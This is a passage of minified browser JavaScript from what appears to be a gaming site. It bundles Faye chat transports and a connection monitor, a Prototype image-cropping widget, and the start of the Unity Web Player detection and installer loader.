i._handleError(e);try{t=JSON.parse(r)}catch(e){}t?i._receive(t):i._handleError(e)}},n.send(this.encode(e)),n}}),{isUsable:function(e,t,i,n){i.call(n,a.URI.isSameOrigin(t))}}),a.Transport.register("long-polling",a.Transport.XHR),a.Transport.CORS=a.extend(a.Class(a.Transport,{encode:function(e){return"message="+encodeURIComponent(a.toJSON(e))},request:function(e){var t,i=a.ENV.XDomainRequest?XDomainRequest:XMLHttpRequest,n=new i,s=++a.Transport.CORS._id,o=this._dispatcher.headers,r=this;if(n.open("POST",a.URI.stringify(this.endpoint),!0),n.setRequestHeader)for(t in n.setRequestHeader("Pragma","no-cache"),o)o.hasOwnProperty(t)&&n.setRequestHeader(t,o[t]);var c=function(){if(!n)return!1;a.Transport.CORS._pending.remove(s),n=n.onload=n.onerror=n.ontimeout=n.onprogress=null};return n.onload=function(){var t=null;try{t=JSON.parse(n.responseText)}catch(e){}c(),t?r._receive(t):r._handleError(e)},n.onerror=n.ontimeout=function(){c(),r._handleError(e)},n.onprogress=function(){},i===a.ENV.XDomainRequest&&a.Transport.CORS._pending.add({id:s,xhr:n}),n.send(this.encode(e)),n}}),{_id:0,_pending:new a.Set,isUsable:function(e,t,i,n){return a.URI.isSameOrigin(t)?i.call(n,!1):a.ENV.XDomainRequest?i.call(n,t.protocol===a.ENV.location.protocol):a.ENV.XMLHttpRequest?(e=new a.ENV.XMLHttpRequest,i.call(n,void 0!==e.withCredentials)):i.call(n,!1)}}),a.Transport.register("cross-origin-long-polling",a.Transport.CORS),a.Transport.JSONP=a.extend(a.Class(a.Transport,{encode:function(e){var t=a.copyObject(this.endpoint);return t.query.message=a.toJSON(e),t.query.jsonp="__jsonp"+a.Transport.JSONP._cbCount+"__",a.URI.stringify(t)},request:function(e){var t=document.getElementsByTagName("head")[0],i=document.createElement("script"),n=a.Transport.JSONP.getCallbackName(),s=a.copyObject(this.endpoint),o=this;s.query.message=a.toJSON(e),s.query.jsonp=n;var r=function(){if(!a.ENV[n])return!1;a.ENV[n]=void 0;try{delete a.ENV[n]}catch(e){}i.parentNode.removeChild(i)};return a.ENV[n]=function(e){r(),o._receive(e)},i.type="text/javascript",i.src=a.URI.stringify(s),t.appendChild(i),i.onerror=function(){r(),o._handleError(e)},{abort:r}}}),{_cbCount:0,getCallbackName:function(){return this._cbCount+=1,"__jsonp"+this._cbCount+"__"},isUsable:function(e,t,i,n){i.call(n,!0)}}),a.Transport.register("callback-polling",a.Transport.JSONP)}();var slice=Array.prototype.slice;Evented={on:function(e,t,i){if(this.__callbacks||(this.__callbacks={}),this.__callbacks[e]||(this.__callbacks[e]=[]),i){var n=slice.call(arguments,3);n.unshift(t),n=Function.prototype.bind.apply(t[i],n)}else n=t;this.__callbacks[e].push(n)},trigger:function(e){var t=slice.call(arguments,1);this.__callbacks&&this.__callbacks[e]&&$j.each(this.__callbacks[e],(function(e,i){i.apply(null,t)}))}},function(){if("undefined"!=typeof Faye){var e=Faye.Transport.prototype._receive;Faye.Transport.prototype._receive=function(){e.apply(this,arguments);var t=this._dispatcher;t._state!==t.UP&&(t._state=t.UP,t._client.trigger("transport:up"))}}}(),FayeBackoffScheduler=function(){Faye.Scheduler.apply(this,arguments)},function(){function e(){}e.prototype=Faye.Scheduler.prototype,FayeBackoffScheduler.prototype=new e,FayeBackoffScheduler.prototype.getInterval=function(){return delay=Math.pow(this.attempts,2)+Math.random(5),Math.min(60,delay)}}(),FayeMessageTransformer={transform:function(e){return"0"===(e={version:e[0],kuid:e[1],uuid:e[2],text:e[3],timestamp:e[4],user_id:e[5],username:e[6],character_name:e[7],level:e[8],admin:0<=e[10].indexOf("a"),developer:0<=e[10].indexOf("d"),mobile:0<=e[10].indexOf("m"),premium:0<=e[10].indexOf("p"),guid:e[9]}).kuid?(e.data=JSON.parse(e.text),e.type=e.data.type):e.type="chat",e}},FayeConnectionMonitor=function(e){this.initialize(e)},FayeConnectionMonitor.prototype={initialize:function(e){this._client=e.client,this._transportDown=!1,this._disconnected=!0,this._disconnectTimeout=e.timeout||2e4,this._addListeners()},isConnected:function(){return!this._disconnected},destroy:function(){this._removeListeners(),this._clearTimeout(),this._client=void 0},_clearTimeout:function(){clearTimeout(this._timeout),this._timeout=void 0},_addListeners:function(){var e=this;this._upListener=function(){var t=e._disconnected;e._clearTimeout(),e._transportDown=!1,e._disconnected=!1,t&&e.trigger("connect")},this._downListener=function(){e._transportDown=!0,e._timeout=setTimeout((function(){e._transportDown&&e._client&&(e._disconnected=!0,e._ping(),e.trigger("disconnect"))}),e._disconnectTimeout)},this._client.on("transport:up",this._upListener),this._client.on("transport:down",this._downListener)},_removeListeners:function(){this._client.removeListener("transport:up",this._upListener),this._client.removeListener("transport:down",this._downListener),this._upListener=this._downListener=void 0},_isWebSocket:function(){return"websocket"===this._client._dispatcher.connectionType},_ping:function(){this._isWebSocket()||this._client.publish("/service/ping",{})}},$j.extend(FayeConnectionMonitor.prototype,Evented);var CropDraggable=Class.create(Draggable,{initialize:function(e,t){this.options=Object.extend({drawMethod:function(){}},t||{}),this.handle=this.element=$(e),this.delta=this.currentDelta(),this.dragging=!1,this.eventMouseDown=this.initDrag.bindAsEventListener(this),Event.observe(this.handle,"mousedown",this.eventMouseDown),Draggables.register(this)},draw:function(e){var t=Element.cumulativeOffset(this.element),i=this.currentDelta();t[0]-=i[0],t[1]-=i[1],i=[0,1].map(function(i){return e[i]-t[i]-this.offset[i]}.bind(this)),this.options.drawMethod(i)}}),Cropper={};if(Cropper.Img=Class.create({initialize:function(e,t){this.options=Object.extend({ratioDim:{x:0,y:0},minWidth:0,minHeight:0,displayOnInit:!1,onEndCrop:Prototype.emptyFunction,captureKeys:!0,onloadCoords:null,maxWidth:0,maxHeight:0,autoIncludeCSS:!1},t||{}),this.img=$(e),this.clickCoords={x:0,y:0},this.resizing=this.dragging=!1,this.isWebKit=/Konqueror|Safari|KHTML/.test(navigator.userAgent),this.isIE=/MSIE/.test(navigator.userAgent),this.isOpera8=/Opera\s[1-8]/.test(navigator.userAgent),this.ratioY=this.ratioX=0,this.attached=!1,this.fixedWidth=0<this.options.maxWidth&&this.options.minWidth>=this.options.maxWidth,this.fixedHeight=0<this.options.maxHeight&&this.options.minHeight>=this.options.maxHeight,void 0!==this.img&&(this.options.autoIncludeCSS&&$$("script").each((function(e){if(e.src.match(/\/cropper([^\/]*)\.js/)){e=e.src.replace(/\/cropper([^\/]*)\.js.*/,"");var t=document.createElement("link");t.rel="stylesheet",t.type="text/css",t.href=e+"/cropper.css",t.media="screen",document.getElementsByTagName("head")[0].appendChild(t)}})),0<this.options.ratioDim.x&&0<this.options.ratioDim.y&&(e=this.getGCD(this.options.ratioDim.x,this.options.ratioDim.y),this.ratioX=this.options.ratioDim.x/e,this.ratioY=this.options.ratioDim.y/e),this.subInitialize(),this.img.complete||this.isWebKit?this.onLoad():Event.observe(this.img,"load",this.onLoad.bindAsEventListener(this)))},getGCD:function(e,t){return 0===t?e:this.getGCD(t,e%t)},onLoad:function(){var e=this.img.parentNode,t="";this.isOpera8&&(t=" opera8"),this.imgWrap=new Element("div",{class:"imgCrop_wrap"+t}),this.north=new Element("div",{class:"imgCrop_overlay imgCrop_north"}).insert(new Element("span")),this.east=new Element("div",{class:"imgCrop_overlay imgCrop_east"}).insert(new Element("span")),this.south=new Element("div",{class:"imgCrop_overlay imgCrop_south"}).insert(new Element("span")),this.west=new Element("div",{class:"imgCrop_overlay imgCrop_west"}).insert(new Element("span")),t=[this.north,this.east,this.south,this.west],this.dragArea=new Element("div",{class:"imgCrop_dragArea"}),t.each((function(e){this.dragArea.insert(e)}),this),this.handleN=new Element("div",{class:"imgCrop_handle imgCrop_handleN"}),this.handleNE=new Element("div",{class:"imgCrop_handle imgCrop_handleNE"}),this.handleE=new Element("div",{class:"imgCrop_handle imgCrop_handleE"}),this.handleSE=new Element("div",{class:"imgCrop_handle imgCrop_handleSE"}),this.handleS=new Element("div",{class:"imgCrop_handle imgCrop_handleS"}),this.handleSW=new Element("div",{class:"imgCrop_handle imgCrop_handleSW"}),this.handleW=new Element("div",{class:"imgCrop_handle imgCrop_handleW"}),this.handleNW=new Element("div",{class:"imgCrop_handle imgCrop_handleNW"}),this.selArea=new Element("div",{class:"imgCrop_selArea"}),[new Element("div",{class:"imgCrop_marqueeHoriz imgCrop_marqueeNorth"}).insert(new Element("span")),new Element("div",{class:"imgCrop_marqueeVert imgCrop_marqueeEast"}).insert(new Element("span")),new Element("div",{class:"imgCrop_marqueeHoriz imgCrop_marqueeSouth"}).insert(new Element("span")),new Element("div",{class:"imgCrop_marqueeVert imgCrop_marqueeWest"}).insert(new Element("span")),this.handleN,this.handleNE,this.handleE,this.handleSE,this.handleS,this.handleSW,this.handleW,this.handleNW,new Element("div",{class:"imgCrop_clickArea"})].each((function(e){this.selArea.insert(e)}),this),this.imgWrap.appendChild(this.img),this.imgWrap.appendChild(this.dragArea),this.dragArea.appendChild(this.selArea),this.dragArea.appendChild(new Element("div",{class:"imgCrop_clickArea"})),e.appendChild(this.imgWrap),this.startDragBind=this.startDrag.bindAsEventListener(this),Event.observe(this.dragArea,"mousedown",this.startDragBind),this.onDragBind=this.onDrag.bindAsEventListener(this),Event.observe(document,"mousemove",this.onDragBind),this.endCropBind=this.endCrop.bindAsEventListener(this),Event.observe(document,"mouseup",this.endCropBind),this.resizeBind=this.startResize.bindAsEventListener(this),this.handles=[this.handleN,this.handleNE,this.handleE,this.handleSE,this.handleS,this.handleSW,this.handleW,this.handleNW],this.registerHandles(!0),this.options.captureKeys&&(this.keysBind=this.handleKeys.bindAsEventListener(this),Event.observe(document,"keypress",this.keysBind)),new CropDraggable(this.selArea,{drawMethod:this.moveArea.bindAsEventListener(this)}),this.setParams()},registerHandles:function(e){for(var t=0;t<this.handles.length;t++){var i=$(this.handles[t]);if(e){var n=!1;if(this.fixedWidth&&this.fixedHeight)n=!0;else if(this.fixedWidth||this.fixedHeight){var s=i.className.match(/([S|N][E|W])$/),o=i.className.match(/(E|W)$/),a=i.className.match(/(N|S)$/);(s||this.fixedWidth&&o||this.fixedHeight&&a)&&(n=!0)}n?i.hide():Event.observe(i,"mousedown",this.resizeBind)}else i.show(),Event.stopObserving(i,"mousedown",this.resizeBind)}},setParams:function(){this.imgW=this.img.width,this.imgH=this.img.height,$(this.north).setStyle({height:0}),$(this.east).setStyle({width:0,height:0}),$(this.south).setStyle({height:0}),$(this.west).setStyle({width:0,height:0}),$(this.imgWrap).setStyle({width:this.imgW+"px",height:this.imgH+"px"}),$(this.selArea).hide();var e={x1:0,y1:0,x2:0,y2:0},t=!1;null!==this.options.onloadCoords?(e=this.cloneCoords(this.options.onloadCoords),t=!0):0<this.options.ratioDim.x&&0<this.options.ratioDim.y&&(e.x1=Math.ceil((this.imgW-this.options.ratioDim.x)/2),e.y1=Math.ceil((this.imgH-this.options.ratioDim.y)/2),e.x2=e.x1+this.options.ratioDim.x,e.y2=e.y1+this.options.ratioDim.y,t=!0),this.setAreaCoords(e,!1,!1,1),this.options.displayOnInit&&t&&(this.selArea.show(),this.drawArea(),this.endCrop()),this.attached=!0},remove:function(){this.attached&&(this.attached=!1,this.imgWrap.parentNode.insertBefore(this.img,this.imgWrap),this.imgWrap.parentNode.removeChild(this.imgWrap),Event.stopObserving(this.dragArea,"mousedown",this.startDragBind),Event.stopObserving(document,"mousemove",this.onDragBind),Event.stopObserving(document,"mouseup",this.endCropBind),this.registerHandles(!1),this.options.captureKeys&&Event.stopObserving(document,"keypress",this.keysBind))},reset:function(){this.attached?this.setParams():this.onLoad(),this.endCrop()},handleKeys:function(e){var t=0,i=0;if(!this.dragging){switch(e.keyCode){case 37:t=-1;break;case 38:i=-1;break;case 39:t=1;break;case 40:i=1}0===t&&0===i||(e.shiftKey&&(t*=10,i*=10),this.moveArea([this.areaCoords.x1+t,this.areaCoords.y1+i]),this.endCrop(),Event.stop(e))}},calcW:function(){return this.areaCoords.x2-this.areaCoords.x1},calcH:function(){return this.areaCoords.y2-this.areaCoords.y1},moveArea:function(e){this.setAreaCoords({x1:e[0],y1:e[1],x2:e[0]+this.calcW(),y2:e[1]+this.calcH()},!0,!1),this.drawArea()},cloneCoords:function(e){return{x1:e.x1,y1:e.y1,x2:e.x2,y2:e.y2}},setAreaCoords:function(e,t,i,n,s){if(t)i=e.x2-e.x1,n=e.y2-e.y1,0>e.x1&&(e.x1=0,e.x2=i),0>e.y1&&(e.y1=0,e.y2=n),e.x2>this.imgW&&(e.x2=this.imgW,e.x1=this.imgW-i),e.y2>this.imgH&&(e.y2=this.imgH,e.y1=this.imgH-n);else if(0>e.x1&&(e.x1=0),0>e.y1&&(e.y1=0),e.x2>this.imgW&&(e.x2=this.imgW),e.y2>this.imgH&&(e.y2=this.imgH),null!==n&&(0<this.ratioX?this.applyRatio(e,{x:this.ratioX,y:this.ratioY},n,s):i&&this.applyRatio(e,{x:1,y:1},n,s),t=[this.options.minWidth,this.options.minHeight],s=[this.options.maxWidth,this.options.maxHeight],0<t[0]||0<t[1]||0<s[0]||0<s[1])){var o={a1:e.x1,a2:e.x2};e={a1:e.y1,a2:e.y2};var a={min:0,max:this.imgW},r={min:0,max:this.imgH};0===t[0]&&0===t[1]||!i||(0<t[0]?t[1]=t[0]:0<t[1]&&(t[0]=t[1])),0===s[0]&&0===s[0]||!i||(0<s[0]&&s[0]<=s[1]?s[1]=s[0]:0<s[1]&&s[1]<=s[0]&&(s[0]=s[1])),0<t[0]&&this.applyDimRestriction(o,t[0],n.x,a,"min"),1<t[1]&&this.applyDimRestriction(e,t[1],n.y,r,"min"),0<s[0]&&this.applyDimRestriction(o,s[0],n.x,a,"max"),1<s[1]&&this.applyDimRestriction(e,s[1],n.y,r,"max"),e={x1:o.a1,y1:e.a1,x2:o.a2,y2:e.a2}}this.areaCoords=e},applyDimRestriction:function(e,t,i,n,s){("min"==s?e.a2-e.a1<t:e.a2-e.a1>t)&&(1==i?e.a2=e.a1+t:e.a1=e.a2-t,e.a1<n.min?(e.a1=n.min,e.a2=t):e.a2>n.max&&(e.a1=n.max-t,e.a2=n.max))},applyRatio:function(e,t,i,n){"N"==n||"S"==n?(t=this.applyRatioToAxis({a1:e.y1,b1:e.x1,a2:e.y2,b2:e.x2},{a:t.y,b:t.x},{a:i.y,b:i.x},{min:0,max:this.imgW}),e.x1=t.b1,e.y1=t.a1,e.x2=t.b2,e.y2=t.a2):(t=this.applyRatioToAxis({a1:e.x1,b1:e.y1,a2:e.x2,b2:e.y2},{a:t.x,b:t.y},{a:i.x,b:i.y},{min:0,max:this.imgH}),e.x1=t.a1,e.y1=t.b1,e.x2=t.a2,e.y2=t.b2)},applyRatioToAxis:function(e,t,i,n){e=Object.extend(e,{});var s=Math.floor((e.a2-e.a1)*t.b/t.a),o=null;return 1==i.b?((s=e.b1+s)>n.max&&(o=(s=n.max)-e.b1),e.b2=s):((s=e.b2-s)<n.min&&(o=(s=n.min)+e.b2),e.b1=s),null!==o&&(t=Math.floor(o*t.a/t.b),1==i.a?e.a2=e.a1+t:e.a1=e.a2-t),e},drawArea:function(){var e=this.calcW(),t=this.calcH(),i=[this.areaCoords.x1+"px",this.areaCoords.y1+"px",e+"px",t+"px",this.areaCoords.x2+"px",this.areaCoords.y2+"px",this.img.width-this.areaCoords.x2+"px",this.img.height-this.areaCoords.y2+"px"],n=this.selArea.style;n.left=i[0],n.top=i[1],n.width=i[2],n.height=i[3],e=Math.ceil((e-6)/2)+"px",t=Math.ceil((t-6)/2)+"px",this.handleN.style.left=e,this.handleE.style.top=t,this.handleS.style.left=e,this.handleW.style.top=t,this.north.style.height=i[1],(t=this.east.style).top=i[1],t.height=i[3],t.left=i[4],t.width=i[6],(t=this.south.style).top=i[5],t.height=i[7],(t=this.west.style).top=i[1],t.height=i[3],t.width=i[0],this.subDrawArea(),this.forceReRender()},forceReRender:function(){if(this.isIE||this.isWebKit){var e,t=document.createTextNode(" ");if(this.isIE)fixEl=this.selArea;else if(this.isWebKit){fixEl=document.getElementsByClassName("imgCrop_marqueeSouth",this.imgWrap)[0];var i=new Element("div");i.style.visibility="hidden";var n=["SE","S","SW"];for(e=0;e<n.length;e++){var s=document.getElementsByClassName("imgCrop_handle"+n[e],this.selArea)[0];s.childNodes.length&&s.removeChild(s.childNodes[0]),s.appendChild(i)}}fixEl.appendChild(t),fixEl.removeChild(t)}},startResize:function(e){this.startCoords=this.cloneCoords(this.areaCoords),this.resizing=!0,this.resizeHandle=Event.element(e).classNames().toString().replace(/([^N|NE|E|SE|S|SW|W|NW])+/,""),Event.stop(e)},startDrag:function(e){this.selArea.show(),this.clickCoords=this.getCurPos(e),this.setAreaCoords({x1:this.clickCoords.x,y1:this.clickCoords.y,x2:this.clickCoords.x,y2:this.clickCoords.y},!1,!1,null),this.dragging=!0,this.onDrag(e),Event.stop(e)},getCurPos:function(e){for(var t=this.imgWrap,i=Element.cumulativeOffset(t);"BODY"!=t.nodeName;)i[1]-=t.scrollTop||0,i[0]-=t.scrollLeft||0,t=t.parentNode;return{x:Event.pointerX(e)-i[0],y:Event.pointerY(e)-i[1]}},onDrag:function(e){if(this.dragging||this.resizing){var t=null,i=this.getCurPos(e),n=this.cloneCoords(this.areaCoords),s={x:1,y:1};this.dragging?(i.x<this.clickCoords.x&&(s.x=-1),i.y<this.clickCoords.y&&(s.y=-1),this.transformCoords(i.x,this.clickCoords.x,n,"x"),this.transformCoords(i.y,this.clickCoords.y,n,"y")):this.resizing&&((t=this.resizeHandle).match(/E/)?(this.transformCoords(i.x,this.startCoords.x1,n,"x"),i.x<this.startCoords.x1&&(s.x=-1)):t.match(/W/)&&(this.transformCoords(i.x,this.startCoords.x2,n,"x"),i.x<this.startCoords.x2&&(s.x=-1)),t.match(/N/)?(this.transformCoords(i.y,this.startCoords.y2,n,"y"),i.y<this.startCoords.y2&&(s.y=-1)):t.match(/S/)&&(this.transformCoords(i.y,this.startCoords.y1,n,"y"),i.y<this.startCoords.y1&&(s.y=-1))),this.setAreaCoords(n,!1,e.shiftKey,s,t),this.drawArea(),Event.stop(e)}},transformCoords:function(e,t,i,n){var s=[e,t];e>t&&s.reverse(),i[n+"1"]=s[0],i[n+"2"]=s[1]},endCrop:function(){this.resizing=this.dragging=!1,this.options.onEndCrop(this.areaCoords,{width:this.calcW(),height:this.calcH()})},subInitialize:function(){},subDrawArea:function(){}}),Cropper.ImgWithPreview=Class.create(Cropper.Img,{subInitialize:function(){this.hasPreviewImg=!1,void 0!==this.options.previewWrap&&0<this.options.minWidth&&0<this.options.minHeight&&(this.previewWrap=$(this.options.previewWrap),this.previewImg=this.img.cloneNode(!1),this.previewImg.id="imgCrop_"+this.previewImg.id,this.hasPreviewImg=this.options.displayOnInit=!0,this.previewWrap.addClassName("imgCrop_previewWrap"),this.previewWrap.setStyle({width:this.options.minWidth+"px",height:this.options.minHeight+"px"}),this.previewWrap.appendChild(this.previewImg))},subDrawArea:function(){if(this.hasPreviewImg){var e=this.calcW(),t=this.calcH(),i=Math.ceil(this.imgH/t*this.options.minHeight)+"px",n="-"+Math.ceil(this.areaCoords.x1/(e/this.options.minWidth))+"px";t="-"+Math.ceil(this.areaCoords.y1/(t/this.options.minHeight))+"px";var s=this.previewImg.style;s.width=Math.ceil(this.imgW/e*this.options.minWidth)+"px",s.height=i,s.left=n,s.top=t}}}),void 0===unityObject)var unityObject=function(){function e(e,t,i){if("installed"==e){if(null==ee||"installed"==ee)return}else if(null!=ee)return;ee=e,ie.send(e,t,i)}function t(e,t,i,n){ee=e,ie.send(e,t,i,n)}function n(e){return!!(e=new RegExp(escape(e)+"=([^;]+)")).test(T.cookie+";")&&(e.exec(T.cookie+";"),RegExp.$1)}function s(e){A?e():k[k.length]=e}function o(){if(!A){try{var e=T.getElementsByTagName("body")[0],t=e.appendChild(T.createElement("span"));e.removeChild(t)}catch(e){return}for(A=!0,e=0;e<k.length;++e)k[e]()}}function a(e){if(void 0!==w.addEventListener)w.addEventListener("load",e,!1);else if(void 0!==T.addEventListener)T.addEventListener("load",e,!1);else if(void 0!==w.attachEvent)r(w,"onload",e);else if("function"==typeof window.onload){var t=window.onload;w.onload=function(){t(),e()}}else w.onload=e}function r(e,t,i){e.attachEvent(t,i),O[O.length]={target:e,type:t,event:i}}function c(e){var t=0;if(e&&(e=e.toLowerCase().match(/^(\d+)(?:\.(\d+)(?:\.(\d+)([dabfr])?(\d+)?)?)?$/))&&e[1]){var i=e[1],n=e[3]?e[3]:0,s=e[4]?e[4]:"r",o=e[5]?e[5]:0;t=(t=t|i/10%10<<28|i%10<<24|(e[2]?e[2]:0)%10<<20)|n%10<<16|{d:8192,a:16384,b:24576,f:32768,r:32768}[s],t|=o/100%10<<8,t|=o/10%10<<4,t|=o%10}return t}function h(e,t){var i=T.getElementsByTagName("body")[0],n=T.createElement("object");if(i&&n){n.setAttribute("type","application/vnd.unity"),n.style.visibility="hidden",i.appendChild(n);var s=0;!function(){if(void 0===n.GetPluginVersion)10>s++?setTimeout(arguments.callee,10):(i.removeChild(n),e(null));else{var o={};if(t)for(var a=0;a<t.length;++a)o[t[a]]=n.GetUnityVersion(t[a]);o.plugin=n.GetPluginVersion(),i.removeChild(n),e(o)}}()}else e(null)}function d(t,i){var n="missing";if(C.plugins.refresh(),void 0!==C.plugins&&C.plugins["Unity Player"]&&void 0!==C.mimeTypes&&C.mimeTypes["application/vnd.unity"]&&C.mimeTypes["application/vnd.unity"].enabledPlugin){if(n="installed",te.sf&&/Mac OS X 10_6/.test(C.appVersion))return void h((function(i){i&&i.plugin||(n="broken",u="OSX10.6-SFx64"),e(n,Y,u),t(n,i)}),i);if(te.mac&&te.ch)return void h((function(i){i&&(c(i.plugin)<=c("2.6.1f3")||c(i.plugin)<c(unityObject.minRequiredVersion))&&(n="broken",u="OSX-CH-U<=2.6.1f3"),e(n,Y,u),t(n,i)}),i);if(i)return void h((function(i){c(i.plugin)<c(unityObject.minRequiredVersion)&&(n="broken"),e(n,Y,u),t(n,i)}),i)}else if(te.ie)try{var s=new ActiveXObject("UnityWebPlayer.UnityWebPlayer.1"),o=s.GetPluginVersion();if(i){for(var a={},r=0;r<i.length;++r)a[i[r]]=s.GetUnityVersion(i[r]);a.plugin=o}if(n="installed","2.5.0f5"==o){var d=/Windows NT \d+\.\d+/.exec(C.userAgent);if(d&&0<d.length&&6<=parseFloat(d[0].split(" ")[2])){n="broken";var u="WIN-U2.5.0f5"}}c(o)<c(unityObject.minRequiredVersion)&&(n="broken")}catch(e){u=te.win&&te.ie&&te.x64?"WIN-IEx64":"ActiveXFailed"}e(n,Y,u),t(n,a)}function u(e){return/^[-+]?[0-9]+$/.test(e)&&(e+="px"),e}function l(e,t,i,n){var s=T.getElementById(e);if(s){if(te.win&&te.ie){var o,a="";for(o in t)t[o]!=Object.prototype[o]&&("styleclass"==o.toLowerCase()?a+=' class="'+t[o]+'"':"classid"!=o.toLowerCase()&&(a+=" "+o+'="'+t[o]+'"'));var r="";for(o in i)i[o]!=Object.prototype[o]&&"classid"!=o.toLowerCase()&&(r+='<param name="'+o+'" value="'+i[o]+'" />');s.outerHTML='<div id="'+e+'" style="width: '+u(t.width)+"; height: "+u(t.height)+'; visibility: hidden;"><object classid="clsid:444785F1-DE89-4295-863A-D46C3A781394" style="display: block; width: 100%; height: 100%;"'+a+">"+r+"</object></div>",R[R.length]=e}else{for(o in(a=T.createElement("div")).setAttribute("id",e),a.style.width=u(t.width),a.style.height=u(t.height),a.style.visibility="hidden",(r=T.createElement("embed")).setAttribute("type","application/vnd.unity"),r.style.display="block",r.style.width="100%",r.style.height="100%",t)t[o]!=Object.prototype[o]&&("styleclass"==o.toLowerCase()?r.setAttribute("class",t[o]):"classid"!=o.toLowerCase()&&r.setAttribute(o,t[o]));for(o in i)i[o]!=Object.prototype[o]&&"classid"!=o.toLowerCase()&&r.setAttribute(o,i[o]);a.appendChild(r),s.parentNode.replaceChild(a,s)}y(e,(function(t){var i;(t?(t.parentNode.style.visibility="visible",te.sf&&te.mac||setTimeout((function(){t.focus()}),100)):b(e),n)&&(t||(i="UnityElementNotFound"),n({success:!!t,id:e,ref:t,type:Y,error:i}))}))}else n&&n({success:!1,id:e,type:Y,error:"UnityElementNotFound"})}function _(e,t){for(var i in e)if(i.toLowerCase()==t){if(e=e[i],/^((?:[\da-f]){2}){3,4}$/i.test(e))return e.substr(0,6);break}return null}function m(e,s,o,r,c,h,d){preInstallCallback=X[e];var l=T.getElementById(e);if(l){var m="standard";if(G&&te.java&&!F&&!n("_unity_triedjava")){$[e]={attributes:s,params:o,callback:r,broken:c};var b="javascript:unityObject.doJavaInstall('"+e+"');";m="java"}else W&&te.co?(b=U+"3.0/co/UnityWebPlayer.application?installer="+encodeURIComponent(U+p()),m="clickonce"):te.win?b=U+p():"MacIntel"==C.platform?(b=U+(H?"webplayer-i386.dmg":"webplayer-mini.dmg"),Z&&(b+="?referrer="+Z)):"MacPPC"==C.platform?(b=U+(H?"webplayer-ppc.dmg":"webplayer-mini.dmg"),Z&&(b+="?referrer="+Z)):(b='javascript:window.open("http://unity3d.com/webplayer/");',m="unsupported");if(t("ready",m),c){var y="Unity Web Player. Install now! Restart your browser after install.",S=P+"/installation/getunityrestart.png";c=190;var w=75}else y="Unity Web Player. Install now!",S=P+"installation/getunity.png",c=193,w=63;var A=s.width||c;s=s.height||w;var k=u(-parseInt(w)),R="unityObject.notifyBeginInstall('"+e+"','"+m+"');unityObject.setInstallStatus('start','"+m+"',null";R="clickonce"!=m?R+",'"+b.replace(/'/g,"\\'")+"');":R+");document.location='"+b+"';",R+="return false;";var O=_(o,"backgroundcolor"),M=_(o,"textcolor");o=_(o,"bordercolor");var I=e+"_img";if(te.win&&te.ie){var N='<img id="'+I+'" alt="'+y+'" src="'+S+'" width="'+c+'" height="'+w+'" style="border-width: 0px;" />';b='<a href="'+b+'" title="'+y+'" onclick="'+R+'"',L&&(b+=' style="display: block; height: '+u(w)+"; position: relative; top: "+k+';"'),b+=">"+N+"</a>",w="",O&&(w+=" background-color: #"+O+";"),M&&(w+=" color: #"+M+";"),o&&(w+=" border: 1px solid #"+o+";"),L?(c='<div style="width: '+u(c)+'; margin: auto; position: relative;">'+b+"</div>",l.outerHTML='<div id="'+e+'" style="width: '+u(A)+"; height: "+u(s)+"; text-align: center;"+w+'">'+c+"</div>"):l.outerHTML='<div id="'+e+'" style="'+w+'">'+b+"</div>"}else{var D=T.createElement("div");D.setAttribute("id",e),O&&(D.style.backgroundColor="#"+O),M&&(D.style.color="#"+M),o&&(D.style.border="1px solid #"+o),L&&(D.style.width=u(A),D.style.height=u(s),(N=T.createElement("div")).style.width=u(c),N.style.margin="auto",N.style.position="relative"),(A=T.createElement("a")).setAttribute("href",b),A.setAttribute("title",y),A.setAttribute("onclick",R),L&&(A.style.display="block",A.style.height=u(w),A.style.position="relative",A.style.top=k),(b=T.createElement("img")).setAttribute("id",I),b.setAttribute("alt",y),b.setAttribute("src",S),b.setAttribute("width",c),b.setAttribute("height",w),b.style.borderWidth="0px",A.appendChild(b),L?(N.appendChild(A),D.appendChild(N)):D.appendChild(A),l.parentNode.replaceChild(D,l)}E(e,!0)}r&&r({success:!1,id:e,type:h,error:d}),preInstallCallback&&preInstallCallback({id:e,type:m}),Y=m,K?"java"==m?(t("start",m),v(e)):"clickonce"!=m||B||(B=!0,a((function(){t("start",m),T.location=U+"3.0/co/UnityWebPlayer.application?installer="+encodeURIComponent(U+p())}))):"java"==m&&j&&(Q.push(I),function(e){var t=!1;for(i=0;i<Q.length;i++)Q[i]&&(g(T.images[Q[i]])?Q[i]=null:t=!0);t?setTimeout(arguments.callee,100):setTimeout((function(){var t=T.getElementById(e);t||(t=T.createElement("div"),T.body.insertBefore(t,T.body.lastChild.nextSibling)),f({id:e,type:"application/x-java-applet",code:"JVMPreloader",width:1,height:1,name:"JVM Preloader"},{context:e,codebase:U+"3.0/jws/",classloader_cache:!1,scriptable:!0,mayscript:!0},t),E(e,!0)}),100)}(e+"_java"))}function p(){var e=H?"UnityWebPlayerFull.exe":"UnityWebPlayer.exe";return Z&&(e+="?referrer="+Z),e}function f(e,t,i){if(te.win&&te.ie){var n,s="";for(n in e)s+=" "+n+'="'+e[n]+'"';for(n in e="",t)e+='<param name="'+n+'" value="'+t[n]+'" />';i.outerHTML="<object"+s+">"+e+"</object>"}else{for(n in s=T.createElement("object"),e)s.setAttribute(n,e[n]);for(n in t)(e=T.createElement("param")).name=n,e.value=t[n],s.appendChild(e);i.parentNode.replaceChild(s,i)}}function g(e){return!(void 0===e||!e.complete||void 0!==e.naturalWidth&&0==e.naturalWidth)}function v(e){var t=F=!0;document.cookie=escape("_unity_triedjava")+"="+escape(t)+"; path=/",t=T.getElementById(e);var i=$[e],n={id:e,type:"application/x-java-applet",archive:U+"3.0/jws/UnityWebPlayer.jar",code:"UnityWebPlayer",width:i.attributes.width||600,height:i.attributes.height||450,name:"Unity Web Player"};te.win&&te.ff&&(n.style="visibility: hidden;");var s=U+"3.0/jws/UnityWebPlayer.jnlp",o=U;if(te.win)var a=p();else a="UnityPlayer.plugin.zip",Z&&(a+="?referrer="+Z);for(var r in s={context:e,jnlp_href:s,classloader_cache:!1,installer:o+a,image:P+"installation/unitylogo.png",centerimage:!0,boxborder:!1,scriptable:!0,mayscript:!0},i.params)"src"!=r&&i.params[r]!=Object.prototype[r]&&(s[r]=i.params[r],"logoimage"==r.toLowerCase()?s.image=i.params[r]:"backgroundcolor"==r.toLowerCase()?s.boxbgcolor="#"+i.params[r]:"bordercolor"==r.toLowerCase()?s.boxborder=!0:"textcolor"==r.toLowerCase()&&(s.boxfgcolor="#"+i.params[r]));f(n,s,t),E(e,!0)}function b(e){var 